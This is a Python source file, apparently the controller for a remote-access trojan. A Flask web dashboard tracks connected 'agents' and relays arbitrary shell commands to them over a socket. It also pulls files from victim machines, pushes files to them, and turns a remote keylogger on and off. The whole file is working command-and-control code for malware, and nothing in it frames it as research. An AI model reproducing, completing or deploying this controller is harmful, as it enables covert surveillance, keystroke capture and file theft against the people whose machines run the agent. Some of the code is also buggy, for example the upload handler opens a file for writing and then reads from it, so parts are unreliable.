from os import close
import socket
import threading,time
from datetime import datetime
import flask
from flask import Flask, render_template, redirect, url_for, request
from pathlib import Path

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IP = []
AGENT_STATUS = []
CMD_HISTORY = []

for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IP.append('')
    AGENT_STATUS.append('Offline')
    CMD_HISTORY.append([])

app = Flask(__name__)

def handle_connection(connection, address, thread_index):
    global CMD_OUTPUT, CMD_INPUT, AGENT_STATUS

    AGENT_STATUS[thread_index] = 'Online'

    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index] = msg

        while True:
            if  CMD_INPUT[thread_index]!= '':
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                    print(filename)
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000)
                    f = open(filename,'wb')
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index] = "File Downloaded Successfully"
                    add_to_history(thread_index, cmd, CMD_OUTPUT[thread_index])
                    CMD_INPUT[thread_index]= ''

                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('.\\output\\'+filename,'wb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'received file':
                        CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                        add_to_history(thread_index, cmd, CMD_OUTPUT[thread_index])
                        CMD_INPUT[thread_index] = ''
                    else:
                        CMD_OUTPUT[thread_index] = 'Some Error Occurred'
                        add_to_history(thread_index, cmd, CMD_OUTPUT[thread_index])
                        CMD_INPUT[thread_index] = ''


                elif CMD_INPUT[thread_index] == 'keylog on':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    add_to_history(thread_index, cmd, msg)
                    CMD_INPUT[thread_index] = ''

                elif CMD_INPUT[thread_index] == 'keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    add_to_history(thread_index, cmd, msg)
                    CMD_INPUT[thread_index] = ''


                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    add_to_history(thread_index, msg, CMD_OUTPUT[thread_index])
                    CMD_INPUT[thread_index] = ''
                    break
    close_connection(connection, thread_index)

def add_to_history(thread_index, cmd, output):
    """Add command to history, keeping only last 10"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    history_entry = {
        'command': cmd,
        'output': output[:200] if len(output) > 200 else output,
        'timestamp': timestamp
    }
    CMD_HISTORY[thread_index].append(history_entry)
    if len(CMD_HISTORY[thread_index]) > 10:
        CMD_HISTORY[thread_index].pop(0)

def close_connection(connection,thread_index):
    connection.close()
    THREADS[thread_index] = ''
    IP[thread_index] = ''
    CMD_INPUT[thread_index] = ''
    CMD_OUTPUT[thread_index] = ''
    AGENT_STATUS[thread_index] = 'Offline'

def server_socket():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 9999))
    server_socket.listen(5)
    global THREADS
    global IP
    while True:
        connection, address = server_socket.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, len(THREADS)))
        THREADS.append(t)
        IP.append(address)
        t.start()

@app.route("/")
def root():
    return redirect(url_for('home'))

@app.route("/home")
def home():
    active_agents = sum(1 for status in AGENT_STATUS if status == 'Online')
    total_commands = sum(len(history) for history in CMD_HISTORY)
    return render_template('index.html', active_agents=active_agents, total_commands=total_commands)

@app.route("/agents")
def agents():
    agents_data = []
    for i in range(len(THREADS)):
        if THREADS[i] != '':
            agent_name = THREADS[i].name if hasattr(THREADS[i], 'name') else f"Agent-{i}"
            ip_addr = IP[i] if IP[i] else 'Unknown'
            status = AGENT_STATUS[i]
            agents_data.append({
                'name': agent_name,
                'ip': ip_addr[0] if isinstance(ip_addr, tuple) else ip_addr,
                'port': ip_addr[1] if isinstance(ip_addr, tuple) else 'N/A',
                'status': status,
                'index': i,
                'history': CMD_HISTORY[i]
            })

    return render_template('agents.html', agents_data=agents_data)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template('execute.html', agentname=agentname, cmdoutput="")

@app.route("/<agentname>/execute",methods=['Get','POST'])
def execute(agentname):
    cmdoutput = ""
    if request.method=='POST':
        cmd = request.form.get('command')
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index] = cmd
        time.sleep(5)
        cmdoutput = CMD_OUTPUT[req_index]

    return render_template('execute.html', agentname=agentname, cmdoutput=cmdoutput)

if __name__ == '__main__':
    s1 = threading.Thread(target=server_socket)
    s1.start()
    app.run(debug=True)